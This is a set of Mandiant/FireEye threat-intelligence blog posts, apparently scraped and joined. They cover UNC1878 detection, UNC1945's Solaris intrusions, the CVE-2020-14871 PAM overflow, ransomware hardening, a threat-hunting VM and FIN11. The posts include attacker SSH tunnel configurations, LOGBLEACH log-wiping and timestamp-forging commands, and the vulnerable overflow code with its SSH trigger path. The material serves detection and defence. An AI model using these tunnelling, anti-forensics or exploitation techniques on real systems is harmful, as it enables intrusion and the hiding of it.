through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware. Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr Value: Path to the backdoor Figure 4: Example registry RUN key used by WINEKEY to maintain persistence The ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case. The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: < Random directory within %APPDATA% > autoupdate#< random number >. All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise. Although it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the C:\\Windows\\SysWOW64 directory that have a file name matching the following pattern: < 8 random lowercase chars >.exe. Stacking or sorting on file creation timestamps in the C:\\Windows\\SysWOW64 directory may also help identify malicious files, as the directory should be mostly static. Post-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence. The following are additional strategies that may aid in identifying associated activity: Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration or communication services with a referrer from a Google Docs document. During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share. While collecting data used to enable later-stage operations, the attackers commonly leave instances of ntds.dit and exports of the SYSTEM and SECURITY registry hives on impacted systems. Hardening Strategies The actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper . Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation. Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins.Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor. Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON. Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that do not have a business categorization. Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.

                "text": "Through Mandiant investigation of intrusions, the FLARE Advanced Practices team observed a group we track as UNC1945 compromise managed service providers and operate against a tailored set of targets within the financial and professional consulting industries by leveraging access to third-party networks (see this blog post for an in-depth description of “UNC” groups). UNC1945 targeted Oracle Solaris operating systems, utilized several tools and utilities against Windows and Linux operating systems, loaded and operated custom virtual machines, and employed techniques to evade detection. UNC1945 demonstrated access to exploits, tools and malware for multiple operating systems, a disciplined interest in covering or manipulating their activity, and displayed advanced technical abilities during interactive operations. Mandiant discovered and reported to Oracle CVE-2020-14871 , which was addressed in Oracle's October 2020 Critical Patch Update . Mandiant recommends staying current on all current patch updates to ensure a high security posture. We will discuss this vulnerability in greater detail in a follow up blog post. UNC1945 Attack Lifecycle The threat actor demonstrated experience and comfort by utilizing unique tactics, techniques and procedures (TTPs) within Unix environments, demonstrating a high level of acumen in conjunction with ease of operability in Microsoft Windows operating systems. They were successful navigating multiple segmented networks and leveraging third-party access to extend operations well beyond the initial victim. Furthermore, UNC1945 operated from several virtual machines pre-configured with post-exploitation tools in addition to their custom toolset to evade detection and forensics. Initial Compromise In late 2018, UNC1945 gained access to a Solaris server and installed a backdoor we track as SLAPSTICK in order to capture connection details and credentials to facilitate further compromise. The SSH service of this server was exposed to the internet at the time, the same time we observed first evidence of threat activity. Unfortunately, due to insufficient available evidence, the next indication of activity was in mid-2020 at which time a different Solaris server was observed connecting to the threat actor infrastructure. This indicates a dwell time of approximately 519 days based on recovered artifacts. Although we were unable to determine how the late-2018 initial access was accomplished, we did observe successful UNC1945 SSH connections directly to the victim Solaris 10 server, since the SSH service was exposed directly to the internet at the time. In mid-2020, we observed UNC1945 deploy EVILSUN—a remote exploitation tool containing a zero-day exploit for CVE-2020-14871—on a Solaris 9 server. At the time, connections from the server to the threat actor IP address were observed over port 8080. Mandiant discovered and reported CVE-2020-14871, a recently patched vulnerability in the Oracle Solaris Pluggable Authentication Module (PAM) that allows an unauthenticated attacker with network access via multiple protocols to exploit and compromise the operating system. According to an April 2020 post on a black-market website, an “Oracle Solaris SSHD Remote Root Exploit” was available for approximately $3,000 USD, which may be identifiable with EVILSUN. Additionally, we confirmed a Solaris server exposed to the internet had critical vulnerabilities, which included the possibility of remote exploitation without authentication. Establish Foothold and Maintain Persistence The threat actor used a Solaris Pluggable Authentication Module backdoor we refer to as SLAPSTICK to establish a foothold on a Solaris 9 server. This facilitated user access to the system with a secret hard-coded password and allowed the threat actors to escalate privileges and maintain persistence (see Figure 1). Log –font –unix | /usr/lib/ssh/sshd sshd kbdint - can <Encoded Password> <IP REDACTED> Magical Password auth.info | sshd[11800]: [ID 800047 auth.info] Accepted keyboard-interactive for root from <IP REDACTED> port 39680 ssh2 auth.notice | su: [ID 366847 auth.notice] ‘su root’ - succeeded for netcool on /dev/pts/31 Figure 1: SLAPSTICK logs At the initial victim, UNC1945 placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder. A day later, the threat actor positioned a custom Linux backdoor, which Mandiant named LEMONSTICK, on the same workstation. LEMONSTICK capabilities include command execution, file transfer and execution, and the ability to establish tunnel connections. (see Figure 2).

SSH Port Forwarding is a mechanism implemented in SSH protocol for transporting arbitrary networking data over an encrypted SSH connection (tunneling). This feature can be used for adding encryption to legacy applications traversing firewalls or with malicious intent to access internal networks from the the internet. The UNC1945 configurations we observed are similarly structured with respect to the host alias, specified options, and option order (see Figure 3). config1 config2 Host <redacted> HostName <redacted> Port 900 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null RemoteForward 33002 127.0.0.1:22 Host <redacted> HostName <redacted> Port 443 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null ServerAliveInterval 30 ServerAliveCountMax 3 RemoteForward 2224 <redacted>:22 Figure 3: SSH config files used by UNC1945 at different incidents As part of this multi-stage operation, UNC1945 dropped a custom QEMU Virtual Machine (VM) on multiple hosts, which was executed inside of any Linux system by launching a ‘start.sh’ script. The script contained TCP forwarding settings that could be used by the threat actor in conjunction with the SSH tunnels to give direct access from the threat actor VM to the command and control server to obfuscate interaction with customer infrastructure. The VM was running a version of the Tiny Core Linux OS with pre-loaded scripts and tools. Also, we analyzed the Virtual Machine file system timestamps, which coincided with UNC1945's overall operational timeline. The VM contained numerous tools such as network scanners, exploits and reconnaissance tools. Tiny Core Linux pre-loaded tools included Mimikatz, Powersploit, Responder, Procdump, CrackMapExec, PoshC2, Medusa, JBoss Vulnerability Scanner and more. Efforts to decrease operational visibility included placing tool and output files within temporary file system mount points that were stored in volatile memory. Additionally, UNC1945 used built-in utilities and public tools to modify timestamps and selectively manipulate Unix log files. UNC1945 employed anti-forensics techniques with the use of a custom ELF utility named LOGBLEACH. The actor used built-in Linux commands to alter the timestamps of files and directories and used LOGBLEACH to clean logs to thwart forensic analysis, as seen in Figure 4. $ ./b -C -y -a $ mv b /usr/lib64/libXbleach.so.1 $ cd /usr/lib64/ $ touch -acm -r librpmio.so.3.2.2 $ touch -acm -r libyaml-0.so.2 Figure 4: LOGBLEACH To further obfuscate activity, a Linux ELF packer named STEELCORGI was executed in memory on the Solaris system. The malware contains various anti-analysis techniques, including anti-debugging, anti-tracing, and string obfuscation. It uses environment variables as a key to unpack the final payload. Escalate Privileges and Lateral Movement After successfully establishing a foothold, UNC1945 collected credentials, escalated privileges, and successfully moved laterally through multiple networks. UNC1945 obtained credentials via SLAPSTICK and open source tools such as Mimikatz, which enabled easy lateral movement throughout networks to obtain immediate access to other segments of the network and third-party environments. Stolen credentials collected by SLAPSTICK were used to traverse the customer network via SSH and deploy SLAPSTICK to additional hosts. After successfully authenticating, SLAPSTICK displays a welcome message, as seen in Figure 5. Figure 5: SLAPSTICK backdoor welcome banner UNC1945 used ProxyChains to download PUPYRAT, an open source, cross-platform multi-functional remote administration and post-exploitation tool mainly written in Python. At one target, the threat actor used a virtual machine to initiate a brute-force of SSH targeting Linux and HP-UX endpoints. Beginning with seemingly random usernames and shifting to legitimate Linux and Windows accounts, the threat actor successfully established SSH connections on a Linux endpoint. After successfully escalating privileges on an HP-UX endpoint and a Linux endpoint, UNC1945 installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO. We observed UNC1945 use IMPACKET with SMBEXEC in a Microsoft Windows environment to execute commands remotely without the need to upload a payload to the target. SMBEXEC allows the threat actor to operate like PsExec, but without using RemComSvc. There are two main modes of using this tool that benefits attackers. Share mode allows the specification of a share that everything will be executed through. Server mode permits the output of the executed commands to be sent back by the target machine into a locally shared folder. At one victim, we observed UNC1945 moving laterally via Remote Desktop Protocol (RDP) to a Windows server before viewing the Server Manager Panel, viewing and modifying RDP-related system firewall rules and checking the application settings of two endpoint security services. Internal Reconnaissance Mandiant investigations found that the threat actor maintains various tools to interact with victim networks. In addition to custom tools, the UNC1945 VMs contained various tools (e.g. network scanners, exploits and reconnaissance; see Associated Tools and Malware section). In some intrusions, UNC1945 employed a SPARC executable identified as a reconnaissance tool. Based on publicly available information, this executable could be referred to as Luckscan or BlueKeep, the latter of which is part of the BKScan toolkit (see Figure 6). Figure 6: SPARC executable recon tool command line used by the threat actor According to open sources, BlueKeep, aka “bkscan” scanner , works both unauthenticated and authenticated (i.e. when Network Level Authentication is enabled). BlueKeep (CVE-2019-0708) is a security vulnerability that was discovered in Microsoft's Remote Desktop Protocol (RDP) implementation, which allows for the possibility of remote code execution. Complete Mission Despite this multi-staged operation, Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions we investigated. In at least one case, we observed ROLLCOAST ransomware deployment in the final phase of the threat actor activity, but Mandiant didn’t attribute this activity to UNC1945. At this time, it is likely that access to the victim environment was sold to another group. Conclusion The ease and breadth of exploitation in which UNC1945 conducted this campaign suggests a sophisticated, persistent actor comfortable exploiting various operating systems, and access to resources and numerous toolsets. Given the aforementioned factors, use of zero-day exploits and virtual machines, and ability to traverse multiple third-party networks, Mandiant expects this motivated threat actor to continue targeted operations against key industries while taking advantage of operating systems that likely have inadequate security visibility. Associated Tools and Malware Families EVILSUN is a remote exploitation tool that gains access to Solaris 10 and 11 systems of SPARC or i386 architecture using a vulnerability (CVE-2020-14871) exposed by SSH keyboard-interactive authentication. The remote exploitation tool makes SSH connections to hosts passed on the command line. The default port is the normal SSH port (22), but this may be overridden. EVILSUN passes the banner string SSH-2.0-Sun_SSH_1.1.3 over the connection in clear text as part of handshaking. LEMONSTICK is a Linux executable command line utility with backdoor capabilities. The backdoor can execute files, transfer files, and tunnel connections. LEMONSTICK can be started in two different ways: passing the `-c` command line argument (with an optional file) and setting the ‘OCB’ environment variable. When started with the `-c` command line argument, LEMONSTICK spawns an interactive shell. When started in OCB mode, LEMONSTICK expects to read from STDIN. The STDIN data is expected to be encrypted with the blowfish algorithm. After decrypting, it dispatches commands based on the name—for example: ‘executes terminal command’, ‘connect to remote system’, ‘send & retrieve file’, ‘create socket connection’. LOGBLEACH is an ELF utility that has a primary functionality of deleting log entries from a specified log file(s) based on a filter provided via command line. The following log files are hard coded in the malware, but additional log paths may be specified: /var/run/utmp /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/faillog /var/log/syslog /var/log/messages /var/log/secure /var/log/auth.log OKSOLO is a publicly available backdoor that binds a shell to a specified port. It can be compiled to support password authentication or dropped into a root shell. OPENSHACKLE is a reconnaissance tool that collects information about logged-on users and saves it to a file. OPENSHACKLE registers Windows Event Manager callback to achieve persistence. ProxyChains allows the use of SSH, TELNET, VNC, FTP and any other internet application from behind HTTP (HTTPS) and SOCKS (4/5) proxy servers. This \"proxifier\" provides proxy server support to any application. PUPYRAT (aka Pupy) is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function RAT (Remote Administration Tool) and post-exploitation tool mainly written in Python. It features an all-in-memory execution guideline and leaves very low footprint. It can communicate using various transports, migrate into processes (reflective injection), and load remote Python code, Python packages and Python C-extensions from memory. STEELCORGI is a packer for Linux ELF programs that uses key material from the executing environment to decrypt the payload. When first starting up, the malware expects to find up to four environment variables that contain numeric values. The malware uses the environment variable values as a key to decrypt additional data to be executed. SLAPSTICK is a Solaris PAM backdoor that grants a user access to the system with a secret, hard-coded password. TINYSHELL is a lightweight client/server clone of the standard remote shell tools (rlogin, telnet, ssh, etc.), which can act as a backdoor and provide remote shell execution as well as file transfers.

                "text": "FireEye Mandiant has been investigating compromised Oracle Solaris machines in customer environments. During our investigations, we discovered an exploit tool on a customer’s system and analyzed it to see how it was attacking their Solaris environment. The FLARE team’s Offensive Task Force analyzed the exploit to determine how it worked, reproduced the vulnerability on different versions of Solaris, and then reported it to Oracle. In this blog post we present a description of the vulnerability, offer a quick way to test whether a system may be vulnerable, and suggest mitigations and workarounds. Mandiant experts from the FLARE team will provide more information on this vulnerability and how it was used by UNC1945 during a Nov. 12 webinar. Register today and start preparing questions, because we will be fielding them from the audience at the end of the session. Vulnerability Discovery The security vulnerability occurs in the Pluggable Authentication Modules (PAM) library. PAM enables a Solaris application to authenticate users while allowing the system administrator to configure authentication parameters (e.g., password complexity and expiration) in one location that is consistently enforced by all applications. The actual vulnerability is a classic stack-based buffer overflow located in the PAM parse_user_name function . An abbreviated version of this function is shown in Figure 1. static int parse_user_name(char *user_input, char **ret_username) { register char *ptr; register int index = 0; char username[PAM_MAX_RESP_SIZE]; /* ... */ ptr = user_input; /* ... */ /* * username will be the first string we get from user_input * - we skip leading whitespaces and ignore trailing whitespaces */ while (*ptr != '\\0') { if ((*ptr == ' ') || (*ptr == '\\t')) break; else { username[index] = *ptr; index++; ptr++; } } /* ret_username will be freed in pam_get_user(). */ if ((*ret_username = malloc(index + 1)) == NULL) return (PAM_BUF_ERR); (void) strcpy(*ret_username, username); return (PAM_SUCCESS); } Figure 1: The parse_user_name function has a stack-based buffer overflow vulnerability The vulnerability arises whenever a username longer than PAM_MAX_RESP_SIZE (512 bytes) is passed to parse_user_name . The vulnerability has likely existed for decades, and one possible reason is that it is only exploitable if an application does not already limit usernames to a smaller length before passing them to PAM. One situation where network-facing software does not always limit the username length arises in the SSH server, and this is the exploit vector used by the tool that we discovered. SSH Keyboard-Interactive authentication is a “passthrough” authentication mechanism where the SSH protocol relays prompts and responses between the server’s PAM libraries and the client. It was designed to support custom forms of authentication such as two-factor without modifying the SSH protocol. By manipulating SSH client settings to force Keyboard-Interactive authentication to prompt for the username rather than sending it through normal means, an attacker can also pass unlimited input to the PAM parse_user_name function. Proof of Concept Exploit In order to quickly test different versions of Solaris to see if they may be vulnerable, we developed a proof of concept exploit to trigger the overflow and crash the SSH server. The standard OpenSSH client offers all the options needed to trigger the vulnerability (Figure 2). Figure 2: A server can be quickly tested to see if it is vulnerable over SSH The indication that the server is vulnerable is that the SSH client prints “Authentication failed;” a non-vulnerable PAM library causes the SSH server to repeatedly prompt for a username if it receives one that is too long. The overflow in the PAM library also causes the SSH server to crash, as shown in Figure 3. The operating system writes a crash dump to /core if the SSH server crashes with no debugger attached. In fact, if a /core file exists on a Solaris machine and the file command reports that it is from sshd , those are indicators consistent with this vulnerability having been exploited. Figure 3: The SSH server crashes in the parse_user_name function Vulnerable Operating Systems Solaris 9 (some releases) Solaris 10 (all releases) Solaris 11.0 While the parse_user_name function remains vulnerable in unpatched Solaris 11.1 and later, unrelated changes to the PAM library truncate the username before the vulnerable function receives it, rendering the issue non-exploitable via SSH. If the parse_user_name function were reachable in another context, then the vulnerability could become exploitable. Illumos (OpenIndiana 2020.04) Mitigations and Workaround A patch from Oracle for Solaris 10 and 11 is described in the October 2020 Critical Patch Update . Because Solaris 9 is no longer supported, Oracle has not released a patch. For Solaris 9, as well as Solaris 10 or 11 systems where patching is inconvenient, we recommend editing the /etc/ssh/sshd_config file to add the lines ChallengeResponseAuthentication no and KbdInteractiveAuthentication no and restart the SSH server. While this removes the opportunity to exploit the vulnerability using SSH Keyboard-Interactive authentication, there may be other ways to attack the parse_user_name function and we recommend using this workaround only as a stopgap until Solaris 9 systems can be upgraded, or the October patch can be accessed and installed for supported Solaris versions.

                "text": "UPDATE (Oct. 30, 2020): We have updated the report to include additional protection and containment strategies based on front-line visibility and response efforts in combating ransomware. While the full scope of recommendations included within the initial report remain unchanged, the following strategies have been added into the report: Windows Firewall rule configurations to block specific binaries from establishing outbound connections from endpoints Domain Controller isolation and recovery planning steps Proactive GPO permissions review and monitoring guidance Ransomware is a global threat targeting organizations in all industries. The impact of a successful ransomware event can be material to an organization - including the loss of access to data, systems, and operational outages. The potential downtime, coupled with unforeseen expenses for restoration, recovery, and implementation of new security processes and controls can be overwhelming. Ransomware has become an increasingly popular choice for attackers over the past few years, and it’s easy to understand why given how simple it is to leverage in campaigns – while offering a healthy financial return for attackers. In our latest report, Ransomware Protection and Containment Strategies: Practical Guidance for Endpoint Protection, Hardening, and Containment , we discuss steps organizations can proactively take to harden their environment to prevent the downstream impact of a ransomware event. These recommendations can also help organizations with prioritizing the most important steps required to contain and minimize the impact of a ransomware event after it occurs. Ransomware is commonly deployed across an environment in two ways: Manual propagation by a threat actor after they’ve penetrated an environment and have administrator-level privileges broadly across the environment: Manually run encryptors on targeted systems. Deploy encryptors across the environment using Windows batch files (mount C$ shares, copy the encryptor, and execute it with the Microsoft PsExec tool). Deploy encryptors with Microsoft Group Policy Objects (GPOs). Deploy encryptors with existing software deployment tools utilized by the victim organization. Automated propagation: Credential or Windows token extraction from disk or memory. Trust relationships between systems – and leveraging methods such as Windows Management Instrumentation (WMI), SMB, or PsExec to bind to systems and execute payloads. Unpatched exploitation methods (e.g., EternalBlue – addressed via Microsoft Security Bulletin MS17-010 ). The report covers several technical recommendations to help organizations mitigate the risk of and contain ransomware events including: Endpoint segmentation Hardening against common exploitation methods Reducing the exposure of privileged and service accounts Cleartext password protections If you are reading this report to aid your organization’s response to an existing ransomware event, it is important to understand how the ransomware was deployed through the environment and design your ransomware response appropriately. This guide should help organizations in that process. Read the report today . *Note: The recommendations in this report will help organizations mitigate the risk of and contain ransomware events. However, this report does not cover all aspects of a ransomware incident response. We do not discuss investigative techniques to identify and remove backdoors (ransomware operators often have multiple backdoors into victim environments), communicating and negotiating with threat actors, or recovering data once a decryptor is provided.

A key aspect of the role may include the requirement to hunt, study and triage previously undiscovered or recently emerging threats by discerning data for evil. Threat analysts apply a variety of structured analytical methods in order to develop meaningful and relevant products for their customers. With this distribution we aim to enable users to: Conduct hunting activities or missions Create adversarial playbooks using evidence-based knowledge Develop and apply a range of analytical products amongst datasets Perform analytical pivoting across forensic artifacts and elements Emulate advanced offensive security tradecraft Enable situational awareness through intelligence sharing and reporting Applied data science techniques & visualize clusters of symbolic data Leverage open intelligence sources to provide unique insights for defense and offense Akin to both FLARE-VM and Commando VM , ThreatPursuit VM uses Boxstarter , Chocolatey and MyGet packages to install software that facilitates the many aspects related to roles performed by analysts. The tools installed provide easy access to a broad range of tooling, including, but not limited to, threat analytics, statistics, visualisation, threat hunting, malware triage, adversarial emulation, and threat modelling. Here are some of the tools, but there are many more: MISP OpenCTI Elasticsearch, Kibana, Logstash Splunk Threat Hunter Playbook CSIRO Data61 Constellation Maltego RStudio MITRE CALDERA Jupyter Notebook Python SilkETW For a full list of tools, please visit our GitHub repository . Installation Similar to FLARE-VM and Commando VM , it's recommended to install ThreatPursuit VM in a virtual machine. The following is an overview of the minimal and recommended installation requirements. Requirements Windows 10 1903 or greater 60 GB Hard Drive 4 GB RAM Recommended Windows 10 1903 80+ GB Hard Drive 6+ GB RAM 1 network adapter OpenGL Graphics Card 1024mb Enable Virtualization support for VM Required for Docker (MISP, OpenCTI) Standard Install The easiest way to install ThreatPursuit VM is to use the following steps. This will install all the default tools and get you finding evil in no time! Create and configure a new Windows 10 VM with the aforementioned requirements. Ensure VM is updated completely. You may need to check for updates, reboot and check again until no more remain. Install your specific VM guest tools (e.g., VMware Tools) to allow additional features such as copy/paste and screen resizing. Take a snapshot of your machine! This allows you to always have a clean state. Download and copy install.ps1 to your newly configured VM. Open PowerShell as an administrator. Next, unblock the install file by running: Unblock-File .\\install.ps1 , as seen in Figure 1. Figure 1: Unblock-File installation script Enable script execution by running: Set-ExecutionPolicy Unrestricted -f , as seen in Figure 2. Figure 2: Set-ExecutionPolicy Unrestricted -f script Finally, execute the installer script as follows: .\\install.ps1 After executing install.ps1 , you’ll be prompted for the administrator password in order to automate host restarts during installation as several reboots occur. Optionally, you may pass your password as a command-line argument via \" .\\install.ps1 -password <password>\" . If you do not have a password set, hitting enter when prompted will also work. This will be the last thing you will need to do before the installation is unattended. The script will set up the Boxstarter environment and proceed to download and install the ThreatPursuit VM environment, as seen in Figure 3. Figure 3: Installation script execution The installation process may take upwards of several hours depending on your internet connection speed and the web servers hosting the various files. Figure 4 shows the post-installation desktop environment, featuring the logo and a desktop shortcut. You will know when the install is finished with the VM's logo placed on the background. Figure 4: ThreatPursuit VM desktop installed Custom Install Is the standard installation too much for you? We provide a custom installation method that allows you to choose which chocolatey packages get installed. For additional details, see the Custom Install steps at our GitHub repository. Installing Additional Packages Since ThreatPursuit VM uses the Chocolatey Windows package manager, it's easy to install additional packages not included by default. For example, entering the command cinst github as administrator installs GitHub Desktop on your system. To update all currently installed packages to their most recent versions, run the command cup all as administrator. Getting Started: A Use Case As threat analysts, what we choose to pursue will depend on the priorities and requirements of our current role. Often, they vary with each threat or adversary encountered such as financial crime, espionage, issue-motivated groups or individuals. The role broadly encompasses the collection and analysis of threat data (e.g., malware, indicators of attack/compromise) with the goal of triaging the data and developing actionable intelligence. For example, one may want to produce detection signatures based on malware network communications to classify, share or disseminate indicators of compromise (IOCs) in standardized ways. We may also use these IOCs in order to develop and apply analytical products that establish clusters of analogous nodes such as MITRE ATT&CK tactics and techniques, or APT groups. On the other hand, our goal can be as simple as triaging a malware sample behavior, hunting for indicators, or proving or disproving a hypothesis. Let's look at how we might start. Open Hunting To start our use case, let’s say we are interested in reviewing latest threat actor activity reported for the quarter. We sign in to the Mandiant Advantage portal (Figure 5) using our public subscription to get a snapshot view of any highlighted activity (Figure 6). Figure 5: Mandiant Advantage portal Figure 6: Actor activity for Q3 2020 Based on Mandiant Advantage report, we notice a number of highly active APT and FIN actors. We choose to drill in to one of these actors by hovering our mouse and selecting the actor tag FIN11. We receive a high-level snapshot summary view of the threat actor, their targeted industry verticals, associated reports and much more, as seen in Figure 7. We also may choose to select the most recent report associated with FIN11 for review. Figure 7: FIN11 actor summary By selecting the “View Full Page” button as seen at the top right corner of Figure 6, we can use the feature to download indicators, as seen in the top right corner of Figure 8. Figure 8: Full FIN11 page Within the FIN11 report, we review the associated threat intelligence tags that contain finished intelligence products. However, we are interested in the collection of raw IOCs (Figure 9) that we could leverage to pivot off or enrich our own datasets. Figure 9: Downloaded FIN11 indicators Using the Malware Information Sharing Platform (MISP )as our collection point, we are going to upload and triage our indicators using our local MISP instance running on ThreatPursuit VM. Please note you will need to ensure your local MISP instance is running correctly with the configuration of your choosing. We select the “Add Event” button, begin populating all needed fields to prepare our import, and then click “Submit”, as shown in Figure 10. Figure 10: MISP triage of events Under the tags section of our newly created FIN11 event, we apply relevant tags to begin associating aspects of contextual information related to our target, as seen in Figure 11. Figure 11: MISP Event setup for FIN11 We then select “Add Attribute” into our event, which will allow us to import our MD5 hashes into the MISP galaxy, as seen in Figure 12. Using both the category and type, we select the appropriate values that best represent our dataset and prepare to submit that data into our event. Figure 12: MISP import events into FIN11 event MISP allows for a streamlined way to drill and tag indicators as well as enrich and pivot with threat intelligence. We can also choose to perform this enrichment process within MISP using a variety of open intelligence sources and their modules, such as Mandiant Advantage , PassiveTotal , Shodan and VirusTotal . We can also achieve the same result using similar tools already packaged in ThreatPursuit VM. Using Maltego CE, installed as part of the VM, we can automate aspects of targeted collection and analysis of our FIN11 malware families and associated infrastructure. The following are just some of the Maltego plugins that can be configured post installation to help with the enrichment and collection process: VirusTotal Public API ThreatCrowd Shodan API Targeting the suspected payload, we attempt to pivot using its MD5 hash value (113dd1e3caa47b5a6438069b15127707) to discover additional artifacts, such as infrastructure, domain record history, previously triaged reports, similar malware samples, timestamps, and the rich headers. Importing our hash into Maltego CE, we can proceed to perform a range of queries to hunt and retrieve interesting information related to our FIN11 malware, as seen in Figure 13. Figure 13: Maltego CE querying MD5 hash Quite quickly we pull back indicators; in this case, generic named detection signatures from a range of anti-malware vendors. Using VirusTotalAPI Public, we perform a series of collection and triage queries across a variety of configured open sources, as shown in Figure 14. Figure 14: Automating enrichment and analysis of targeted infrastructure A visual link has been made public for quick reference. With our newly identified information obtained by passively scraping those IOCs from a variety of data providers, we can identify additional hashes, delivery URLs and web command and control locations, as shown in Figure 15. Figure 15: Maltego visualization of FIN11 dropper Pivoting on the suspected FIN11 delivery domain near-fast[.]com, we have found several more samples that were uploaded to an online malware sandbox website AppAnyRun . Within the ThreatPursuit VM Google Chrome browser and in the Tools directory, there are shortcuts and bookmarks to a range of sandboxes to help with accessing and searching them quickly. We can use AppAnyRun to further analyze the heterogenous networks and execution behaviors of these acquired samples. We have identified another similar sample, which is an XLS document named “MONITIORING REPORT.xls” with the MD5 hash 5d7d2371668ad4a6484f76b0b6511961 (Figure 16). Let’s attempt to triage this newly discovered sample and qualify the relationship back to FIN11. Figure 16: VirusTotal execution report of 5d7d2371668ad4a6484f76b0b6511961 Extracting interesting strings and indicators from this sample allows us to compare these artifacts against our own dynamic analysis. If we can’t access the original malware sample, but we have other indicators to hunt with, we could also pivot on various unique characteristics and attributes (e.g., imphash, vthash, pdb string, etc...) to discover related samples. Even without access to the sample, we can also use YARA to mine for similar malware samples. One such source to mine is using the mquery tool and their datasets offered via CERT.PL. To fast track the creation of a YARA rule, we leverage the FIN11 YARA rule provided within the FIN11 Mandiant Advantage report . Simply copy and paste the YARA rule into mquery page and select “Query” to perform the search (Figure 17). It may take some time, so be sure to check back later (here are the results ). Figure 17: mquery YARA rule hunting search for FIN11 malware Within our mquery search, we find a generic signature hit on Win32_Spoonbeard_1_beta for the MD5 hash 3c43d080b5badfdde7aff732c066d1b2. We associate this MD5 hash with another sandbox, app.any.run, at the following URL: https://app.any.run/tasks/19ac204b-9381-4127-a5ac-d6b68e0ee92c/ As seen in Figure 18, this sample was first uploaded on May 2, 2019, with an associated infection chain intact. Figure 18: AppAnyRun Execution Report on 3c43d080b5badfdde7aff732c066d1b2 We now have a confident signature hit, but with different named detections on the malware family. This is a common challenge for threat analysts and researchers. However we have gained interesting information about the malware itself such as its execution behavior, encryption methods, dropped files, timelines and command and control server and beacon information. This is more than enough for us to pivot across our own datasets to hunt for previously seen activities and prepare to finalize our report. Once we are confident in our analysis, we can start to model and attribute the malware characteristics. We can leverage other threat exchange communities and intelligence sources to further enrich the information we collected on the sample. Enrichment allows the analysts to greater extrapolate context such as timings, malware similarity, associated infrastructures, and prior targeting information. We will briefly add our content into our MISP instance and apply tags to finalize our review. We may wish to add MITRE ATT&CK tags (Figure 19) relevant across the malware infection chain for our sample as they could be useful from a modelling standpoint. Figure 19: MITRE ATT&CK tags for the malware sample Final Thoughts We hope you enjoyed this basic malware triage workflow use-case using ThreatPursuit VM. There are so many more tools and capabilities within the included toolset such as Machine learning (ML) and ML algorithms, that also assist threat hunters by analyzing large volumes of data quickly. Check out some of FireEye’s ML blog posts here. For a complete list of tools please see the ThreatPursuit VM GitHub repository .

                "text": "Mandiant Threat Intelligence recently promoted a threat cluster to a named FIN (or financially motivated) threat group for the first time since 2017. We have detailed FIN11's various tactics, techniques and procedures in a report that is available now by signing up for Mandiant Advantage Free . In some ways, FIN11 is reminiscent of APT1; they are notable not for their sophistication, but for their sheer volume of activity. There are significant gaps in FIN11’s phishing operations, but when active, the group conducts up to five high-volume campaigns a week. While many financially motivated threat groups are short lived, FIN11 has been conducting these widespread phishing campaigns since at least 2016. From 2017 through 2018, the threat group primarily targeted organizations in the financial, retail, and hospitality sectors. However, in 2019 FIN11’s targeting expanded to include a diverse set of sectors and geographic regions. At this point, it would be difficult to name a client that FIN11 hasn’t targeted. Mandiant has also responded to numerous FIN11 intrusions, but we’ve only observed the group successfully monetize access in few instances. This could suggest that the actors cast a wide net during their phishing operations, then choose which victims to further exploit based on characteristics such as sector, geolocation or perceived security posture. Recently, FIN11 has deployed CLOP ransomware and threatened to publish exfiltrated data to pressure victims into paying ransom demands. The group’s shifting monetization methods—from point-of-sale (POS) malware in 2018, to ransomware in 2019, and hybrid extortion in 2020—is part of a larger trend in which criminal actors have increasingly focused on post-compromise ransomware deployment and data theft extortion. Notably, FIN11 includes a subset of the activity security researchers call TA505 , but we do not attribute TA505’s early operations to FIN11 and caution against using the names interchangeably. Attribution of both historic TA505 activity and more recent FIN11 activity is complicated by the actors’ use of criminal service providers. Like most financially motivated actors, FIN11 doesn’t operate in a vacuum. We believe that the group has used services that provide anonymous domain registration, bulletproof hosting, code signing certificates, and private or semi-private malware. Outsourcing work to 